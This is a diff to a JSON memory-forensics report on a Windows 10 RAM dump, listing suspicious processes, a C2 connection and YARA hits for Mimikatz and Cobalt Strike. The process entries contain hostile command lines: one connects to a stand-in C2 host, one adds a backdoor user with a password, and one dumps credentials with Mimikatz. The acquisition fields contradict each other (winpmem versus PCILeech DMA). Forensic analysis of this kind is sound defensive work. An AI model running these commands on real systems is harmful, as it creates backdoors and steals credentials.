@@ -1,15 +1,105 @@
 {
   "image": "memdump.raw",
   "size_bytes": 8589934592,
+  "size_human": "8.0 GiB",
+  "acquired_with": "winpmem v4.0.1",
+  "acquired_at": "2026-03-15 14:42:11+09:00",
+  "acquisition_method": "FPGA-DMA-mapped read of RAM via PCILeech",
+  "page_size": 4096,
+  "kernel_base": "0xfffff80067a00000",
+  "kdbg_offset": "0xfffff80067af0220",
   "suggested_profile": "Win10x64_19041",
-  "kdbg_offset": "0xf80067af0220",
+  "detected_os": "Windows 10 Enterprise (10.0.19045.5371)",
+  "physical_layout": [
+    {
+      "start": "0x0",
+      "end": "0x9d000",
+      "size": "0x9d000"
+    },
+    {
+      "start": "0x100000",
+      "end": "0xbff70000",
+      "size": "0xbfe70000"
+    },
+    {
+      "start": "0xc0000000",
+      "end": "0x100000000",
+      "size": "0x40000000"
+    }
+  ],
+  "loaded_modules_count": 247,
   "suspicious_processes": [
-    {"pid": 4812, "ppid": 2148, "name": "remote-admin.exe", "cmdline": "remote-admin.exe --connect c2.example.com", "injected": false},
-    {"pid": 5120, "ppid": 4812, "name": "cmd.exe",          "cmdline": "cmd.exe /c net user backdoor P@ssw0rd! /add", "injected": false},
-    {"pid": 3001, "ppid": 4812, "name": "svchost.exe",      "cmdline": "C:\\Windows\\System32\\svchost.exe -k netsvcs", "injected": true, "injection_details": "WerFault hollowing, .rdata RWX"}
+    {
+      "pid": 4812,
+      "ppid": 2148,
+      "name": "remote-admin.exe",
+      "image_path": "C:\\Users\\analyst\\Downloads\\remote-admin.exe",
+      "cmdline": "remote-admin.exe --connect c2.example.com",
+      "create_time": "2026-03-15 14:23:11.704",
+      "session_id": 2,
+      "user": "CORP\\analyst",
+      "injected": false,
+      "vad_anomalies": [
+        "RWX section at 0x000001d4a8740000 size=0x12000"
+      ],
+      "open_handles": 142,
+      "open_network_connections": 1
+    },
+    {
+      "pid": 5120,
+      "ppid": 4812,
+      "name": "cmd.exe",
+      "image_path": "C:\\Windows\\System32\\cmd.exe",
+      "cmdline": "cmd.exe /c net user backdoor P@ssw0rd! /add",
+      "create_time": "2026-03-15 14:35:02.118",
+      "session_id": 2,
+      "user": "CORP\\analyst",
+      "injected": false,
+      "vad_anomalies": [],
+      "open_handles": 38,
+      "open_network_connections": 0
+    },
+    {
+      "pid": 6010,
+      "ppid": 4812,
+      "name": "mimikatz.exe",
+      "image_path": "C:\\Users\\analyst\\Downloads\\mimikatz.exe",
+      "cmdline": "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
+      "create_time": "2026-03-15 15:01:00.211",
+      "session_id": 2,
+      "user": "CORP\\analyst",
+      "injected": false,
+      "vad_anomalies": [
+        "RWX section at 0x00000275bc890000 size=0x18000"
+      ],
+      "open_handles": 219,
+      "open_network_connections": 0,
+      "lsass_handle_opened": true
+    }
   ],
   "network_connections": [
-    {"pid": 4812, "local": "10.0.0.42:49312",  "remote": "192.0.2.88:443",  "state": "ESTABLISHED", "protocol": "TCP"},
-    {"pid": 3001, "local": "10.0.0.42:49315",  "remote": "192.0.2.88:4444", "state": "ESTABLISHED", "protocol": "TCP"}
+    {
+      "pid": 4812,
+      "local": "10.0.0.50:50117",
+      "remote": "198.51.100.77:8443",
+      "state": "ESTABLISHED",
+      "proto": "tcp",
+      "process": "remote-admin.exe"
+    }
+  ],
+  "injected_modules": [],
+  "yara_hits": [
+    {
+      "rule": "Mimikatz",
+      "process": "mimikatz.exe",
+      "pid": 6010,
+      "offset": "0x00000275bc8a14b8"
+    },
+    {
+      "rule": "CobaltStrike_Beacon_Strings",
+      "process": "remote-admin.exe",
+      "pid": 4812,
+      "offset": "0x000001d4a874f291"
+    }
   ]
 }
